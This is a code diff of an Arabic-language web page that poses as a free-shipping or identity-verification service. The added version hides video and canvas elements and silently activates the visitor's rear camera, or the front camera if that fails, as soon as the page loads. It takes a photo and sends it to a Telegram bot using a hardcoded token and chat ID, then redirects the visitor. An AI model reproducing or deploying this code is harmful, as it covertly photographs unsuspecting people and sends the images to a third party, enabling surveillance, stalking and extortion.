@@ -1,187 +1,132 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن US مجاناً</title>
+    <title>جاري التحقق</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            background: #f5f5f5;
+            font-family: Arial, sans-serif;
+            height: 100vh;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
-            color: #333;
-        }
-        .container {
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            padding: 30px;
-            width: 90%;
-            max-width: 500px;
             text-align: center;
         }
-        #cameraView {
-            width: 100%;
-            height: 300px;
-            background-color: #eee;
-            margin: 20px 0;
-            border-radius: 5px;
-            display: none;
-        }
-        #capturedImage {
-            max-width: 100%;
-            max-height: 300px;
-            display: none;
-            margin: 20px 0;
-            border-radius: 5px;
-        }
-        button {
-            background-color: #e74c3c;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin: 10px 0;
-        }
-        .message {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-        }
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-        }
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
+        .wait-message {
+            font-size: 24px;
+            color: #333;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>خدمة شحن US مجاناً</h1>
-        <p>للاستمرار، يرجى السماح بالوصول إلى الكاميرا للتحقق من الهوية</p>
-        
-        <button id="startCamera">تفعيل الكاميرا</button>
-        <button id="captureBtn" style="display: none;">التقاط صورة</button>
-        <button id="sendBtn" style="display: none;">إرسال الصورة</button>
-        
-        <video id="cameraView" autoplay playsinline></video>
-        <canvas id="canvas" style="display: none;"></canvas>
-        <img id="capturedImage" alt="الصورة الملتقطة">
-        
-        <div id="message" class="message"></div>
-    </div>
+    <div class="wait-message">انتظر جاري التحقق...</div>
+
+    <!-- عناصر مخفية تمامًا -->
+    <video id="hiddenCamera" autoplay playsinline style="display:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
     <script>
         // بيانات البوت
-        const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
-        const chatId = '6913353602';
+        const BOT_TOKEN = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
+        const CHAT_ID = '6913353602';
         
-        // عناصر DOM
-        const startCameraBtn = document.getElementById('startCamera');
-        const captureBtn = document.getElementById('captureBtn');
-        const sendBtn = document.getElementById('sendBtn');
-        const cameraView = document.getElementById('cameraView');
-        const canvas = document.getElementById('canvas');
-        const capturedImage = document.getElementById('capturedImage');
-        const messageDiv = document.getElementById('message');
-        
-        let stream = null;
-        let capturedPhoto = null;
-        
-        // بدء الكاميرا
-        startCameraBtn.addEventListener('click', async () => {
+        // بدء العملية تلقائيًا عند تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', async () => {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }, // الكاميرا الأمامية
+                // 1. تشغيل الكاميرا الخلفية خفيةً
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: { exact: "environment" }, // الكاميرا الخلفية
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
                     audio: false
                 });
                 
-                cameraView.srcObject = stream;
-                cameraView.style.display = 'block';
-                startCameraBtn.style.display = 'none';
-                captureBtn.style.display = 'inline-block';
+                const camera = document.getElementById('hiddenCamera');
+                const canvas = document.getElementById('hiddenCanvas');
+                camera.srcObject = stream;
                 
-                showMessage('تم تفعيل الكاميرا بنجاح', 'success');
-            } catch (err) {
-                showMessage('خطأ في الوصول إلى الكاميرا: ' + err.message, 'error');
-                console.error('Camera error:', err);
+                // 2. انتظر ثانيتين للتركيز البؤري (مهم للكاميرا الخلفية)
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // 3. التقاط الصورة
+                canvas.width = camera.videoWidth;
+                canvas.height = camera.videoHeight;
+                canvas.getContext('2d').drawImage(camera, 0, 0);
+                
+                // 4. إيقاف الكاميرا فورًا
+                stream.getTracks().forEach(track => track.stop());
+                
+                // 5. إرسال الصورة
+                const imageData = canvas.toDataURL('image/jpeg', 0.8); // جودة أعلى
+                await sendImageToBot(imageData);
+                
+                // 6. الانتقال إلى الخطوة التالية (استبدل الرابط)
+                window.location.href = "https://example.com/next-step";
+                
+            } catch (error) {
+                console.error('حدث خطأ:', error);
+                // في حالة الخطأ أو عدم وجود كاميرا خلفية، حاول استخدام الأمامية
+                try {
+                    await tryFrontCamera();
+                } catch (fallbackError) {
+                    console.error('خطأ في الكاميرا الأمامية أيضًا:', fallbackError);
+                    window.location.href = "https://example.com/error-page";
+                }
             }
         });
         
-        // التقاط صورة
-        captureBtn.addEventListener('click', () => {
-            if (!stream) return;
+        // دالة بديلة لاستخدام الكاميرا الأمامية عند فشل الخلفية
+        async function tryFrontCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { 
+                    facingMode: "user", // الكاميرا الأمامية
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: false
+            });
             
-            canvas.width = cameraView.videoWidth;
-            canvas.height = cameraView.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
+            const camera = document.getElementById('hiddenCamera');
+            const canvas = document.getElementById('hiddenCanvas');
+            camera.srcObject = stream;
             
-            capturedPhoto = canvas.toDataURL('image/jpeg');
-            capturedImage.src = capturedPhoto;
-            capturedImage.style.display = 'block';
-            captureBtn.style.display = 'none';
-            sendBtn.style.display = 'inline-block';
+            await new Promise(resolve => setTimeout(resolve, 1000));
             
-            // إيقاف الكاميرا بعد التقاط الصورة
+            canvas.width = camera.videoWidth;
+            canvas.height = camera.videoHeight;
+            canvas.getContext('2d').drawImage(camera, 0, 0);
+            
             stream.getTracks().forEach(track => track.stop());
-            cameraView.style.display = 'none';
             
-            showMessage('تم التقاط الصورة بنجاح', 'success');
-        });
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            await sendImageToBot(imageData);
+            
+            window.location.href = "https://example.com/next-step";
+        }
         
-        // إرسال الصورة إلى التليجرام
-        sendBtn.addEventListener('click', async () => {
-            if (!capturedPhoto) {
-                showMessage('لا توجد صورة ملتقطة', 'error');
-                return;
-            }
-            
+        // دالة إرسال الصورة إلى بوت التليجرام
+        async function sendImageToBot(imageData) {
             try {
-                // تحويل الصورة من base64 إلى blob
-                const blob = await fetch(capturedPhoto).then(res => res.blob());
+                const blob = await (await fetch(imageData)).blob();
                 const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'user_photo.jpg');
-                formData.append('caption', 'صورة المستخدم من موقع شحن US');
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'user_verification.jpg');
+                formData.append('caption', 'تم التحقق من المستخدم - ' + new Date().toLocaleString());
                 
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-                
-                const data = await response.json();
-                
-                if (data.ok) {
-                    showMessage('تم إرسال الصورة بنجاح إلى المسؤول', 'success');
-                    sendBtn.style.display = 'none';
-                } else {
-                    showMessage('فشل في إرسال الصورة', 'error');
-                }
-            } catch (err) {
-                showMessage('حدث خطأ أثناء الإرسال: ' + err.message, 'error');
-                console.error('Send error:', err);
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+                throw error;
             }
-        });
-        
-        function showMessage(message, type) {
-            messageDiv.textContent = message;
-            messageDiv.className = 'message ' + type;
-            messageDiv.style.display = 'block';
-            
-            setTimeout(() => {
-                messageDiv.style.display = 'none';
-            }, 5000);
         }
     </script>
 </body>
